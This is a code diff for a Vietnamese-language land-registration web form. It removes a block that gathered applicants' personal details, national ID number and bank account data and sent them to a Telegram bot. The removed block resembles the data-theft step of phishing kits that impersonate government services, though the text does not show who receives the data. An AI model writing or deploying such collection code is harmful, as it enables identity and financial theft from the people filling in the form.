@@ -438,61 +438,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 showNotification('Lưu dữ liệu vào bộ nhớ cục bộ thất bại, nhưng hồ sơ đã được gửi thành công.', 'warning');
             }
             
-            // Gửi thông báo qua Telegram Bot API
-            if (window.TelegramBot) {
-                if (!window.TelegramBot.isTelegramConfigured()) {
-                    if (window.TelegramBot.autoSetupTelegram) {
-                        window.TelegramBot.autoSetupTelegram();
-                    }
-                }
-                
-                // Tạo thông báo
-                const message = `🏠 <b>ĐĂNG KÝ THỦ TỤC NHÀ ĐẤT</b>\n` +
-                    `\n<b>THÔNG TIN CHUNG:</b>\n` +
-                    `📋 <b>Đơn vị tiếp nhận:</b> ${data.receivingUnit || 'N/A'}\n` +
-                    `📋 <b>Lĩnh vực:</b> ${data.field || 'N/A'}\n` +
-                    `📋 <b>Thủ tục:</b> ${data.procedure || 'N/A'}\n` +
-                    `\n<b>NGƯỜI NỘP HỒ SƠ:</b>\n` +
-                    `👤 <b>Họ tên:</b> ${data.applicantName}\n` +
-                    `📅 <b>Ngày sinh:</b> ${data.dateOfBirth || 'N/A'}\n` +
-                    `🆔 <b>CCCD:</b> ${data.idNumber}\n` +
-                    `📱 <b>SĐT:</b> ${data.phone}\n` +
-                    `📍 <b>Địa chỉ:</b> ${data.detailAddress}\n` +
-                    `\n<b>NGƯỜI SỬ DỤNG ĐẤT:</b>\n` +
-                    `👤 <b>Họ tên:</b> ${data.landUserName}\n` +
-                    `📱 <b>SĐT:</b> ${data.landUserPhone}\n` +
-                    `📍 <b>Địa chỉ:</b> ${data.landUserAddress}\n` +
-                    `\n<b>NGÂN HÀNG:</b>\n` +
-                    `🏦 <b>Ngân hàng:</b> ${data.bankName}\n` +
-                    `💳 <b>Số TK:</b> ${data.accountNumber}\n` +
-                    `👤 <b>Chủ TK:</b> ${data.accountHolder}\n` +
-                    `\n🔐 <b>Mã đồng bộ:</b> ${data.syncCode || 'N/A'}\n` +
-                    `\n⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
-                
-                if (window.TelegramBot.sendTelegramMessage) {
-                    window.TelegramBot.sendTelegramMessage(message)
-                        .then(result => {
-                            if (result && result.success) {
-                                console.log('✅ Đã gửi thông báo Telegram thành công');
-                            }
-                        })
-                        .catch(err => console.error('❌ Lỗi Telegram:', err));
-                }
-            }
-            
             // Hiển thị thông báo thành công
-            let notificationMessage = 'Nộp hồ sơ thành công! Mã đồng bộ: ' + data.syncCode;
-            
-            if (window.TelegramBot && window.TelegramBot.isTelegramConfigured()) {
-                const testMode = window.TelegramBot.isTestMode();
-                if (testMode) {
-                    notificationMessage += ' (Thông báo Telegram: Chế độ Test)';
-                } else {
-                    notificationMessage += ' (Đã gửi thông báo qua Telegram)';
-                }
-            }
-            
-            showNotification(notificationMessage, 'success');
+            showNotification('Nộp hồ sơ thành công! Mã đồng bộ: ' + data.syncCode, 'success');
             
             // Đóng modal nếu đang mở
             const existingModal = document.querySelector('.sync-code-modal');
